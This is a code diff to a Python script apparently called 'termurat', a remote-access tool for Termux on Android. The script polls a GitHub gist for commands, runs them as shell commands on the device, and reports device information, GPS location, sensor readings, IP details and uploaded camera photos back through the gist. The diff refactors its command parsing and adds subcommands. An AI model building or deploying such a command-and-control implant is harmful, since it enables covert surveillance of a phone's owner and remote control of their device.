@@ -6,7 +6,11 @@ import requests
 import json
 
 
-
+def words(x):
+    w = x.split(" ")
+    if "" in w:
+        w.remove("")
+    return w
 
 
 # Clear screen
@@ -58,8 +62,11 @@ while True:
         file.write(host_data["time"])
 
     command = host_data.get("command", "")
-
-    if command == "termux-location":
+    spl_c = words(command)
+    
+    if command == "":
+        out = ""
+    elif command == "termux-location":
         out = output(f"cd {pwd} && timeout 30 {command} && pwd")
         if not out:
             out = "Timeout. May be caused because the required conditions were not fulfilled."
@@ -67,20 +74,28 @@ while True:
             out = out.split("\n")
             pwd = out.pop(-1)
             out = "\n".join(out)
-    elif command == "termurat exit":
-        edit_gist(data["to_host_gist_id"], "to_host.json", {
-            "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
-            "pwd": pwd,
-            "deviceinfo": dev_inf,
-            "command": command,
-            "info": "Done"
-        })
-        time.sleep(5)
-        parent_pid = os.getppid()
-        os.kill(parent_pid, signal.SIGHUP)
+    elif spl_c[0] == "termurat":
+        if spl_c[1] == "exit":
+            edit_gist(data["to_host_gist_id"], "to_host.json", {
+                "time": time.strftime("%d-%m-%Y_%H:%M:%S"),
+                "pwd": pwd,
+                "deviceinfo": dev_inf,
+                "command": command,
+                "info": "Done"
+            })
+            time.sleep(5)
+            parent_pid = os.getppid()
+            os.kill(parent_pid, signal.SIGHUP)
         
-    elif command == "termurat ipinfo":
-        out = requests.get("https://ipinfo.io/").text
+        elif spl_c[1]  == "ipinfo":
+            out = requests.get("https://ipinfo.io/").text
+        elif spl_c[1] == "clear":
+            run("clear", shell=True)
+            out = "Done"
+        elif spl_c[1] == "print":
+            printing = " ".join(spl_c[2:])
+            print(colorize(printing))
+            out = "Done"
        
     elif command == "termux-sensors":
         out = output(f"cd {pwd} && timeout 30 termux-sensors -a -n 1 && pwd")
@@ -88,7 +103,7 @@ while True:
         pwd = out.pop(-1)
         out = "\n".join(out)
 
-    elif "termux-camera-photo" in command:
+    elif spl_c[0] == "termux-camera-photo":
         run(f"cd {pwd} && {command} temp.jpg", shell=True)
         if os.path.exists(f"{pwd}/temp.jpg"):
             out=upload_image(f"{pwd}/temp.jpg")
